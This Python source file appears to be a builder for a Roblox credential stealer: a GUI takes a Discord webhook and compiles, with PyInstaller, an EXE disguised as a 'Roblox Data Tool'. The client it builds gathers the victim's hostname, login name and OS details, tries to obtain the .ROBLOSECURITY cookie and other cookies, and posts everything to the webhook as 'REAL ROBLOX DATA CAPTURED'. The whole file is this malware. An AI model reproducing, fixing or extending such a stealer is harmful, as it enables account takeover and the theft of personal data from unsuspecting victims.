import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import os
import subprocess
import sys
import tempfile
import platform
import socket
import json

class WebhookTool:
    def __init__(self, root):
        self.root = root
        self.root.title("🔍 Roblox Tool Builder")
        self.root.geometry("700x500")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0a0a')
        
        self.configure_styles()
        self.create_widgets()
    
    def configure_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#0a0a0a')
        style.configure('TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 10))
        style.configure('Title.TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 18, 'bold'))
        style.configure('Header.TLabel', background='#0a0a0a', foreground='#ffffff', font=('Arial', 11, 'bold'))
        
        style.configure('Cool.TButton', 
                       background='#00ff00',
                       foreground='#000000',
                       focuscolor='none',
                       borderwidth=2,
                       relief='raised',
                       font=('Arial', 10, 'bold'))
        
        style.map('Cool.TButton',
                 background=[('active', '#00cc00'),
                           ('pressed', '#009900')],
                 relief=[('pressed', 'sunken')])
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding=20, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_frame = ttk.Frame(main_frame, style='TFrame')
        title_frame.pack(fill=tk.X, pady=(0, 20))
        
        title_label = ttk.Label(title_frame, text="🚀 ROBLOX TOOL BUILDER", style='Title.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(title_frame, text="Build tool to get real Roblox data", style='Header.TLabel')
        subtitle_label.pack(pady=(5, 0))
        
        webhook_frame = ttk.LabelFrame(main_frame, text="📡 WEBHOOK SETUP", padding=20)
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(webhook_frame, text="Discord Webhook URL:", style='Header.TLabel').pack(anchor=tk.W)
        
        self.webhook_entry = tk.Entry(webhook_frame, width=70, font=('Arial', 10),
                                     bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00',
                                     relief='solid', bd=2)
        self.webhook_entry.pack(fill=tk.X, pady=10, ipady=5)
        
        test_btn = ttk.Button(webhook_frame, text="🔍 TEST WEBHOOK", 
                            command=self.test_webhook, style='Cool.TButton',
                            width=20)
        test_btn.pack(pady=10)
        
        build_frame = ttk.LabelFrame(main_frame, text="🛠️ BUILD TOOL", padding=20)
        build_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(build_frame, text="Create Roblox data tool:", style='Header.TLabel').pack(anchor=tk.W)
        
        build_btn = ttk.Button(build_frame, text="⚡ BUILD EXE", 
                             command=self.build_exe, style='Cool.TButton',
                             width=20)
        build_btn.pack(pady=15)
        
        status_frame = ttk.Frame(main_frame, style='TFrame')
        status_frame.pack(fill=tk.X, pady=20)
        
        self.status_label = ttk.Label(status_frame, text="🟢 Ready to build", 
                                     font=('Arial', 9, 'bold'),
                                     foreground='#00ff00')
        self.status_label.pack()
        
        self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(5, 0))
        
        footer_label = ttk.Label(main_frame, text="© 2024 Roblox Tool Builder | v1.0", 
                               font=('Arial', 8),
                               foreground='#444444')
        footer_label.pack(side=tk.BOTTOM, pady=10)
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        self.status_label.config(text="🟡 Testing webhook...")
        self.progress.start()
        
        try:
            data = {
                "content": "**🔍 Webhook Test** - Connection successful! ✅"
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="🟢 Webhook test successful!")
                messagebox.showinfo("Success", "✅ Webhook test successful! Check your Discord.")
            else:
                self.status_label.config(text="🔴 Webhook test failed")
                messagebox.showerror("Error", f"❌ Webhook test failed. Status: {response.status_code}")
                
        except Exception as e:
            self.status_label.config(text="🔴 Error testing webhook")
            messagebox.showerror("Error", f"❌ Failed to test webhook: {str(e)}")
        finally:
            self.progress.stop()
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        self.status_label.config(text="🟡 Building executable...")
        self.progress.start()
        
        try:
            client_script = self.create_client_script(webhook_url)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(client_script)
                temp_script_path = f.name
            
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save Roblox Tool EXE",
                initialfile="RobloxTool.exe"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="🟡 Build cancelled")
                self.progress.stop()
                return
            
            self.status_label.config(text="🟡 Compiling... This may take a minute.")
            self.root.update()
            
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True, timeout=120)
            
            os.unlink(temp_script_path)
            self.status_label.config(text="🟢 EXE built successfully!")
            messagebox.showinfo("Success", "✅ Roblox tool built successfully! Check the 'dist' folder.")
            
        except Exception as e:
            self.status_label.config(text="🔴 Build failed")
            messagebox.showerror("Error", f"❌ Build failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket
import os
import json

class RobloxTool:
    def __init__(self, root):
        self.root = root
        self.root.title("🎮 Roblox Data Tool")
        self.root.geometry("500x400")
        self.root.configure(bg='#0a0a0a')
        self.root.resizable(False, False)
        
        self.create_widgets()
    
    def create_widgets(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title_label = tk.Label(main_frame, text="🎮 ROBLOX DATA TOOL", 
                              font=('Arial', 20, 'bold'),
                              fg='#00ff00', bg='#0a0a0a')
        title_label.pack(pady=20)
        
        desc_label = tk.Label(main_frame, 
                             text="Get real Roblox username, avatar and cookies",
                             font=('Arial', 11),
                             fg='#ffffff', bg='#0a0a0a')
        desc_label.pack(pady=10)
        
        self.collect_btn = tk.Button(main_frame, text="🚀 GET ROBLOX DATA",
                                   command=self.get_roblox_data,
                                   font=('Arial', 14, 'bold'),
                                   bg='#00ff00',
                                   fg='#000000',
                                   activebackground='#00cc00',
                                   activeforeground='#000000',
                                   relief='raised',
                                   bd=4,
                                   width=20,
                                   height=2)
        self.collect_btn.pack(pady=30)
        
        self.status_label = tk.Label(main_frame, text="Ready to collect Roblox data",
                                   font=('Arial', 9),
                                   fg='#00ff00', bg='#0a0a0a')
        self.status_label.pack(pady=10)
        
        footer_label = tk.Label(main_frame, text="Roblox Data Tool v1.0",
                              font=('Arial', 8),
                              fg='#444444', bg='#0a0a0a')
        footer_label.pack(side=tk.BOTTOM)
    
    def get_real_system_info(self):
        try:
            hostname = socket.gethostname()
            system = platform.system()
            version = platform.version()
            username = os.getlogin()
            
            return f"""
**💻 REAL SYSTEM INFO**
- **Computer:** `{{hostname}}`
- **User:** `{{username}}`
- **OS:** `{{system}} {{version}}`
- **Architecture:** `{{platform.architecture()[0]}}`
"""
        except Exception as e:
            return f"**System Info:** `Error: {{str(e)}}`"
    
    def get_real_roblox_data(self):
        try:
            session = requests.Session()
            
            # Get cookies from Roblox
            headers = {{
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://www.roblox.com/'
            }}
            
            # First request to get cookies
            response = session.get('https://www.roblox.com/home', headers=headers, timeout=10)
            cookies = session.cookies.get_dict()
            
            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_FOUND')
            
            # If we have ROBLOSECURITY, get user data
            username = "UNKNOWN"
            user_id = "UNKNOWN" 
            avatar_url = ""
            
            if roblosecurity != 'NOT_FOUND':
                try:
                    # Get user info using the cookie
                    auth_headers = {{
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Cookie': f'.ROBLOSECURITY={{roblosecurity}}',
                        'X-CSRF-TOKEN': 'fetch'
                    }}
                    
                    # Get current user
                    user_response = session.get(
                        'https://users.roblox.com/v1/users/authenticated',
                        headers=auth_headers,
                        timeout=10
                    )
                    
                    if user_response.status_code == 200:
                        user_data = user_response.json()
                        username = user_data.get('name', 'NO_NAME')
                        user_id = user_data.get('id', 'NO_ID')
                        
                        # Get avatar
                        if user_id and user_id != 'NO_ID':
                            avatar_response = session.get(
                                f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=420x420&format=Png&isCircular=false',
                                headers=auth_headers,
                                timeout=10
                            )
                            
                            if avatar_response.status_code == 200:
                                avatar_data = avatar_response.json()
                                if avatar_data.get('data'):
                                    avatar_url = avatar_data['data'][0].get('imageUrl', '')
                    
                except Exception as e:
                    username = f"API_ERROR: {{str(e)}}"
            
            # Format all cookies
            cookie_text = ""
            for cookie_name, cookie_value in cookies.items():
                if len(str(cookie_value)) > 100:
                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value[:100]}}...`\\\\n"
                else:
                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value}}`\\\\n"
            
            return {{
                "username": username,
                "user_id": user_id,
                "avatar_url": avatar_url,
                "roblosecurity": roblosecurity,
                "all_cookies": cookies,
                "cookie_count": len(cookies),
                "cookie_text": cookie_text,
                "status": "SUCCESS"
            }}
            
        except Exception as e:
            return {{
                "username": f"ERROR: {{str(e)}}",
                "user_id": "ERROR",
                "avatar_url": "",
                "roblosecurity": "ERROR",
                "all_cookies": {{}},
                "cookie_count": 0,
                "cookie_text": f"Error: {{str(e)}}",
                "status": "FAILED"
            }}
    
    def get_roblox_data(self):
        self.status_label.config(text="🟡 Getting Roblox data...")
        self.collect_btn.config(state='disabled')
        self.root.update()
        
        try:
            system_info = self.get_real_system_info()
            roblox_data = self.get_real_roblox_data()
            
            # Create Discord embed with real data
            embed = {{
                "title": "🎮 REAL ROBLOX DATA CAPTURED",
                "color": 0x00ff00,
                "fields": [
                    {{
                        "name": "👤 Roblox User",
                        "value": f"**Username:** `{{roblox_data['username']}}`\\\\n**User ID:** `{{roblox_data['user_id']}}`",
                        "inline": True
                    }},
                    {{
                        "name": "🔐 Auth Status",
                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies:** `{{roblox_data['cookie_count']}} found`",
                        "inline": True
                    }},
                    {{
                        "name": "💻 System Info",
                        "value": system_info,
                        "inline": False
                    }},
                    {{
                        "name": "🍪 ROBLOSECURITY Cookie",
                        "value": f"```{{roblox_data['roblosecurity']}}```",
                        "inline": False
                    }},
                    {{
                        "name": "📋 All Cookies ({{roblox_data['cookie_count']}})",
                        "value": roblox_data['cookie_text'] if roblox_data['cookie_text'] else "No cookies found",
                        "inline": False
                    }}
                ]
            }}
            
            # Add thumbnail if we have avatar
            if roblox_data['avatar_url']:
                embed["thumbnail"] = {{"url": roblox_data['avatar_url']}}
            
            data = {{
                "content": "🚨 **REAL ROBLOX DATA CAPTURED**",
                "embeds": [embed]
            }}
            
            response = requests.post("{webhook_url}", json=data, timeout=20)
            
            if response.status_code == 204:
                self.status_label.config(text="🟢 Real data sent successfully!")
                messagebox.showinfo("Success", 
                                  f"✅ **REAL DATA CAPTURED!**\\\\n\\\\n"
                                  f"**Roblox Username:** {{roblox_data['username']}}\\\\n"
                                  f"**User ID:** {{roblox_data['user_id']}}\\\\n"
                                  f"**Cookies Found:** {{roblox_data['cookie_count']}}\\\\n"
                                  f"**Status:** {{roblox_data['status']}}")
            else:
                self.status_label.config(text="🔴 Failed to send")
                messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                
        except Exception as e:
            self.status_label.config(text="🔴 Error occurred")
            messagebox.showerror("Error", f"❌ Failed: {{str(e)}}")
        finally:
            self.collect_btn.config(state='normal')

def main():
    root = tk.Tk()
    app = RobloxTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WebhookTool(root)
    root.mainloop()
